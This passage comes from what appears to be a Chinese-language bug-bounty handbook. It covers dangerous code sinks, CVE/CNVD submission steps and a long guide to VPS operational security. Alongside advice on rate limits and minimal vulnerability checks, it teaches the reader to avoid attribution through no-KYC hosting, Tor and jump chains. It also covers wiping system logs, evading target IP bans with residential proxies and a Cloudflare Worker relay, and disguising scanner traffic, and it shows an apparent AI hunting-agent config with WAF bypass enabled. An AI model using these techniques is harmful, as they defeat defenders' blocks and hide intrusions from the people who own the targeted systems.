| PHP | `eval()`, `system()`, `exec()`, `unserialize()` | RCE/反序列化 |
| PHP | `mysql_query()` + 字符串拼接 | SQL注入 |
| PHP | `include($var)`, `require($var)` | 文件包含 |
| Java | `Runtime.exec()`, `ProcessBuilder` | 命令执行 |
| Java | `ObjectInputStream.readObject()` | 反序列化 |
| Java | `SpelExpressionParser` | SpEL注入 |
| Python | `eval()`, `exec()`, `os.system()` | RCE |
| Python | `pickle.loads()`, `yaml.load()` | 反序列化 |
| Python | `render_template_string(user_input)` | SSTI |
| Go | `exec.Command()` + 用户输入 | 命令注入 |
| Node.js | `child_process.exec()` + 用户输入 | 命令执行 |
| Node.js | `eval(req.body)` | RCE |

### 18.7 提交流程

#### CVE 提交（MITRE）
1. 访问 https://cveform.mitre.org/
2. 填写英文漏洞描述
3. 附上 PoC + 影响版本
4. 等待分配 CVE 编号（1-4周）
5. 建议先报告给厂商等 90 天后再公开

#### CNVD 提交
1. 注册 https://www.cnvd.org.cn 账号
2. 提交漏洞 → 选"通用型"
3. 填写中文报告（用 cnvd_report_template.md）
4. 等待审核（3-15 工作日）
5. 通过后获得 CNVD 编号 + 证书

### 18.8 注意事项

- **先报告厂商** → 等回复 → 再提交 CVE/CNVD
- **不公开 0day** → 在厂商修复前不要发 Twitter/博客
- **截图留证** → 本地环境复现的全过程录屏
- **不攻击线上** → 所有验证在本地 Docker 环境完成
- **影响面统计** → 只用 FOFA 搜索计数，不实际攻击

---

*最后更新：2025-06*



---

## 十九、VPS 安全操作与防封 IP 指南

> SRC 渗透测试中保护自身、避免被目标封禁 IP、避免影响正常业务运行的完整方案

### 19.1 VPS 选择与购买

#### 推荐供应商

| 用途 | 推荐 | 理由 |
|------|------|------|
| 国内 SRC | 香港/日本/新加坡 VPS | 延迟低，不经过 GFW |
| 国外 BB | 美国/欧洲 VPS | 靠近目标 |
| 高匿需求 | 接受加密货币的 VPS | 无 KYC |
| 临时用途 | 按小时计费（Vultr/DigitalOcean） | 用完销毁 |

**具体供应商：**
- **按小时付费**：Vultr / DigitalOcean / Linode — 用完直接销毁实例
- **便宜年付**：BuyVM / RackNerd / Cloudcone / HostHatch
- **高匿名**：Njalla、1984hosting（冰岛）、FlokiNET — 支持加密货币、无实名

#### 选购要点

```
✅ 选择：
- 多个不同地区的 VPS（IP 被封时切换）
- 按小时计费（灵活销毁重建）
- 选择 KVM 虚拟化（性能好、可装嵌套虚拟化）
- 大带宽（扫描需要）

❌ 避免：
- 不用自己常用的 IP 直接打目标
- 不用国内 VPS 打国内 SRC（备案追溯容易）
- 不用同一个 VPS 长期打同一个目标
```

### 19.2 VPS 基础安全加固

```bash
# ═══ 系统更新 ═══
apt update && apt upgrade -y

# ═══ 修改 SSH 端口（防扫描） ═══
sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config
systemctl restart sshd

# ═══ 禁用密码登录（仅密钥） ═══
ssh-keygen -t ed25519 -C "hunter"    # 本地生成密钥
ssh-copy-id -p 2222 user@vps-ip      # 复制公钥到 VPS
sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart sshd

# ═══ 防火墙 ═══
ufw default deny incoming
ufw allow 2222/tcp    # SSH
ufw allow 80/tcp      # 回连接收（interactsh 等）
ufw allow 443/tcp
ufw enable

# ═══ fail2ban 防暴力破解 ═══
apt install fail2ban -y
systemctl enable fail2ban

# ═══ 禁用 IPv6 ═══
echo "net.ipv6.conf.all.disable_ipv6 = 1" >> /etc/sysctl.conf
sysctl -p

# ═══ 时区设置（日志时间统一） ═══
timedatectl set-timezone Asia/Shanghai
```

### 19.3 操作痕迹清理

```bash
# ═══ 禁止记录命令历史 ═══
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
set +o history

# ═══ 单次清理 ═══
history -c && history -w
rm -f ~/.bash_history ~/.zsh_history

# ═══ 系统日志清理 ═══
echo > /var/log/auth.log
echo > /var/log/syslog
echo > /var/log/kern.log
echo > /var/log/wtmp
echo > /var/log/btmp
echo > /var/log/lastlog

# ═══ 定时清理（crontab） ═══
echo "0 */6 * * * root echo > /var/log/auth.log; echo > /var/log/wtmp; echo > /var/log/btmp" >> /etc/crontab

# ═══ 使用 tmux 防断线 ═══
tmux new -s hunt    # 创建
tmux attach -t hunt # 重连
```

### 19.4 多层跳板架构

```
推荐架构（三层隔离）：

┌─────────────────────────────────────────────────────────┐
│  你的电脑                                                │
│  └── VPN/Tor → 跳板机(VPS-A) → 工作机(VPS-B) → 目标     │
│                │                 │                        │
│                │                 ├── proxychains（随机链） │
│                │                 ├── Tor（高敏操作）       │
│                │                 └── 代理池（大量扫描）    │
│                │                                          │
│                └── SSH Tunnel（加密隧道）                  │
└─────────────────────────────────────────────────────────┘

作用：
- VPS-A：纯跳板，不装任何工具，只做 SSH 转发
- VPS-B：工作机，装所有工具，通过代理出流量
- 即使 VPS-B 被溯源，也查不到你的真实 IP
```

```bash
# SSH 跳板连接
ssh -J user@vps-a:2222 user@vps-b:2222

# 创建本地 SOCKS 代理（通过跳板）
ssh -D 1080 -N -f user@vps-a:2222

# SSH 隧道转发远程端口
ssh -L 8080:target-internal:80 user@vps-b:2222
```

### 19.5 代理与 IP 轮换

#### 代理类型对比

| 类型 | 匿名性 | 速度 | 成本 | 适用 |
|------|--------|------|------|------|
| SOCKS5 代理池 | 高 | 中 | 低 | 扫描+验证 |
| Residential 代理 | 最高 | 中 | 高 | 绕 IP 黑名单 |
| Tor | 极高 | 慢 | 免费 | 高敏侦察 |
| Cloud Function | 高 | 快 | 低 | 每请求换 IP |
| VPN 轮换 | 中 | 快 | 中 | 日常操作 |

#### proxychains 配置

```bash
apt install proxychains4 -y

# 编辑 /etc/proxychains4.conf
# 关键配置：
random_chain           # 随机选择代理（非顺序）
chain_len = 2          # 每次随机选 2 个代理
proxy_dns              # DNS 也走代理

# 代理列表（添加多个）：
# socks5 1.2.3.4 1080
# socks5 5.6.7.8 1080
# socks5 9.10.11.12 1080

# 使用：
proxychains4 curl https://target.com
proxychains4 nmap -sT -Pn target.com
proxychains4 sqlmap -u "url"
```

#### Tor 多实例（每个工具用不同出口）

```bash
apt install tor -y

# 修改 /etc/tor/torrc 添加多个 SocksPort：
# SocksPort 9050
# SocksPort 9051
# SocksPort 9052

# 每 10 分钟刷新电路（换出口 IP）：
watch -n 600 'echo -e "AUTHENTICATE\"\"\r\nSIGNAL NEWNYM\r\nQUIT" | nc 127.0.0.1 9051'

# curl 走 Tor：
curl --socks5 127.0.0.1:9050 https://check.torproject.org
```

#### Cloudflare Workers 做 IP 轮换（推荐）

```javascript
// 每次请求通过 CF Worker 中转，自动获得 Cloudflare 的 IP
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  const target = url.searchParams.get('url')
  if (!target) return new Response('Missing url param', { status: 400 })
  
  const resp = await fetch(target, {
    method: request.method,
    headers: request.headers,
    body: request.body,
  })
  return resp
}
// 使用: curl "https://your-worker.workers.dev/?url=https://target.com/api"
// 每次请求 IP 不同（CF 的 IP 池）
```

#### 工具级代理配置

```bash
# httpx
httpx -proxy socks5://127.0.0.1:1080 -l urls.txt -rl 2

# nuclei
nuclei -proxy socks5://127.0.0.1:1080 -rl 3 -l targets.txt

# sqlmap
sqlmap -u "url" --proxy=socks5://127.0.0.1:1080 --random-agent --delay=1

# curl
curl -x socks5h://127.0.0.1:1080 https://target.com

# nmap (需要 TCP connect 模式)
proxychains4 nmap -sT -Pn -T2 target.com

# 全局环境变量
export ALL_PROXY=socks5://127.0.0.1:1080
export HTTP_PROXY=socks5://127.0.0.1:1080
export HTTPS_PROXY=socks5://127.0.0.1:1080
```

### 19.6 限速 — 不触发 WAF / 不影响业务

#### 核心限速原则

```
⚠️ SRC 黄金限速法则：
1. 单目标不超过 3 req/s（保守 2 req/s）
2. 工作日高峰（9:00-18:00）降到 1 req/s
3. 收到 429/503 立即暂停 5-10 分钟
4. 连续 403 超过 5 次 → 换 IP 或停止
5. 夜间（22:00-06:00）可适当提高到 5 req/s
6. 对同一端点的测试间隔 > 2 秒
```

#### 各工具限速配置

```bash
# ═══ httpx ═══
httpx -rl 2 -t 2 -l urls.txt              # 2 req/s, 2 线程

# ═══ nuclei ═══
nuclei -rl 3 -c 2 -bs 3 -l targets.txt    # 3 req/s, 2 并发

# ═══ ffuf ═══
ffuf -u https://target.com/FUZZ -w list.txt -rate 2 -t 1

# ═══ gobuster ═══
gobuster dir -u https://target.com -w list.txt -t 1 --delay 1000ms

# ═══ nmap（超慢但安全） ═══
nmap -T1 --max-rate 5 --max-retries 1 --scan-delay 2s target.com

# ═══ sqlmap ═══
sqlmap -u "url" --delay=2 --timeout=30 --retries=1 \
  --safe-freq=3 --safe-url="https://target.com/"

# ═══ dirsearch ═══
dirsearch -u https://target.com -t 2 --delay=1

# ═══ arjun ═══
arjun -u https://target.com/api -t 2 --stable
```

#### Python 脚本限速模板

```python
import asyncio
import random
import time

class RateLimiter:
    """安全限速器"""
    def __init__(self, requests_per_second=2, jitter=True):
        self.interval = 1.0 / requests_per_second
        self.jitter = jitter
        self.last_request = 0
    
    async def wait(self):
        """等待到可以发送下一个请求"""
        elapsed = time.time() - self.last_request
        wait_time = self.interval - elapsed
        if self.jitter:
            wait_time += random.uniform(0.1, 0.5)  # 随机抖动
        if wait_time > 0:
            await asyncio.sleep(wait_time)
        self.last_request = time.time()

# 使用：
limiter = RateLimiter(requests_per_second=2)

async def safe_request(url):
    await limiter.wait()
    # ... 发送请求
```

### 19.7 HTTP 请求去特征化（不被日志标记为扫描器）

#### User-Agent 伪装

```bash
# ❌ 千万不要用默认 UA：
# python-requests/2.28.0
# Go-http-client/1.1
# sqlmap/1.7
# Nuclei/3.0

# ✅ 使用真实浏览器 UA（随机轮换）：
UA_LIST=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
  "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
)
# 随机选择：
UA="${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}"
curl -H "User-Agent: $UA" https://target.com
```

#### 完整浏览器头伪装

```bash
curl -s https://target.com \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
  -H "Accept-Language: zh-CN,zh;q=0.9,en;q=0.8" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "Connection: keep-alive" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "Sec-Fetch-Dest: document" \
  -H "Sec-Fetch-Mode: navigate" \
  -H "Sec-Fetch-Site: none"
```

#### 行为模拟（像真人浏览）

```
✅ 正确做法：
- 先访问首页 → 再访问子页面（模拟浏览路径）
- 请求间加随机延迟（0.5-3 秒随机，不是固定间隔）
- 偶尔访问 CSS/JS/图片（真实浏览器都会加载这些）
- 使用 Referer 头（从上一个页面跳转过来）
- Cookie 保持一致（不要每次请求都像新会话）

❌ 扫描器特征（会被日志标记）：
- 固定 1 秒间隔请求（机器人特征）
- 短时间大量 404（目录爆破）
- 没有 Cookie 的连续请求
- 请求路径无逻辑（/a → /zzz → /admin → /b）
- 不加载任何静态资源
```

### 19.8 DNS 隐蔽查询

```bash
# ═══ 使用 DoH（DNS over HTTPS）避免 DNS 日志 ═══

# Cloudflare DoH
curl -s "https://cloudflare-dns.com/dns-query?name=target.com&type=A" \
  -H "accept: application/dns-json" | jq '.Answer[].data'

# Google DoH
curl -s "https://dns.google/resolve?name=target.com&type=A" | jq '.Answer[].data'

# ═══ 系统级 DoH（永久生效） ═══
# /etc/systemd/resolved.conf:
# [Resolve]
# DNS=1.1.1.1#cloudflare-dns.com
# DNSOverTLS=yes
# DNSSEC=yes

systemctl restart systemd-resolved

# ═══ 子域名枚举时用被动方式（不产生 DNS 查询） ═══
# 被动枚举（不发 DNS 请求）：
subfinder -d target.com -silent    # 使用 API 被动收集

# 主动枚举（会产生 DNS 请求）：
# 走 Tor/代理，不暴露真实 IP
proxychains4 dnsx -d target.com -w subdomains.txt
```

### 19.9 被封 IP 后的应对

```
发现被封的信号：
- 连续返回 403/429/503
- 响应中出现"IP 已被封禁"/"请完成人机验证"
- 响应时间突然变长（进入黑洞路由）
- 正常页面突然返回空白

应对步骤：
1. 立即停止所有对该目标的请求
2. 等待 30 分钟 - 1 小时
3. 切换到备用 VPS / 新 IP
4. 降低请求频率到 1 req/s
5. 如果持续被封：
   - 换 Residential 代理
   - 使用 Cloudflare Workers 中转
   - 换目标，过几天再回来
```

### 19.10 避免影响目标正常运行

```
⚠️ SRC 生产环境保护原则：

1. 【不做压力测试】
   - 不并发超过 5 个连接
   - 不发送超大 payload（> 1MB）
   - 不循环请求同一接口

2. 【不做破坏性操作】
   - SQLi: 只用 AND 1=1 验证，不 DROP/DELETE
   - XSS: 只 alert(1) 验证，不做钓鱼
   - RCE: 只 whoami/id 验证，不植入后门
   - 文件上传: 只传 .txt 验证，不传 webshell
   - SSRF: 只 DNS 外带验证，不扫内网

3. 【选择测试时间】
   - 优选凌晨 2:00-6:00（流量最低）
   - 避开工作日 9:00-18:00 高峰
   - 避开促销活动期间

4. 【监控目标状态】
   - 测试前确认目标正常响应
   - 测试中定期检查是否影响响应时间
   - 发现响应变慢立即停止

5. 【数据最小化】
   - IDOR 验证只看 1-2 条数据
   - 不下载/导出大量用户信息
   - 截图证明后立即停止
```

### 19.11 你的工具中已有的安全机制

你的 `claude-hunt/auto_agent/config.yaml` 中推荐配置：

```yaml
# 推荐的安全限速配置（SRC 用）
rate_limit:
  requests_per_second: 2       # 保守限速
  max_concurrent: 2            # 最多 2 并发
  delay_between_phases: 10     # 阶段间等 10 秒
  max_total_requests: 300      # 单次最多 300 请求

# 红线检测（自动停止）
redline:
  check_interval: 5            # 每 5 请求检查一次
  max_404_ratio: 0.7           # 404 超过 70% 停止（可能是 WAF）
  max_403_consecutive: 3       # 连续 3 次 403 停止
  forbidden_keywords:
    - "IP已被封禁"
    - "请完成人机验证"
    - "频率过快"
    - "Too Many Requests"
    - "Access Denied"
    - "Blocked"

# WAF 自适应
deep_hunt:
  enable_waf_bypass: true
  waf_type: "auto"             # 自动识别 WAF 类型

# 代理配置
waf_evasion:
  proxy_pool:
    - "socks5://proxy1:1080"
    - "socks5://proxy2:1080"
    - "socks5://proxy3:1080"
```

### 19.12 完整操作 SOP（标准操作流程）

```
┌──────────────────────────────────────────────────────────────┐
│  SRC 安全操作标准流程                                         │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. 准备阶段                                                 │
│     □ 开新 VPS（按小时付费）                                  │
│     □ 配置 SSH 密钥登录 + 改端口                              │
│     □ 安装 proxychains + Tor                                 │
│     □ 配置代理池（至少 3 个 SOCKS5）                          │
│     □ 测试代理是否工作: curl ifconfig.me                      │
│                                                              │
│  2. 侦察阶段（被动优先）                                      │
│     □ 被动子域名收集（subfinder -silent）                     │
│     □ Wayback / gau 收集历史 URL                             │
│     □ Google Dork 搜索（不直接访问目标）                       │
│     □ FOFA/Shodan 查端口和指纹                               │
│     → 此阶段不直接访问目标，零日志                             │
│                                                              │
│  3. 主动扫描（通过代理 + 限速）                               │
│     □ 检查目标是否正常（curl 测试）                            │
│     □ httpx 存活探测（-rl 2）                                │
│     □ nuclei 漏洞扫描（-rl 3 通过代理）                       │
│     □ 参数发现（arjun --stable）                             │
│     → 全程走代理，限速 2-3 req/s                              │
│                                                              │
│  4. 漏洞验证（精准 + 最小化）                                 │
│     □ 只验证存在性，不扩大利用                                │
│     □ SQLi: AND 1=1 vs AND 1=2                              │
│     □ XSS: alert(document.domain) 截图即止                   │
│     □ IDOR: 看 1 条别人的数据即止                             │
│     □ RCE: whoami 截图即止                                   │
│     → 手动操作，不用自动化工具深入                             │
│                                                              │
│  5. 收尾阶段                                                 │
│     □ 整理漏洞报告 + 截图                                     │
│     □ 提交 SRC 平台                                          │
│     □ 清理 VPS 日志                                          │
│     □ 销毁临时 VPS                                           │
│     □ 本地证据加密保存                                        │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

*最后更新：2025-06*
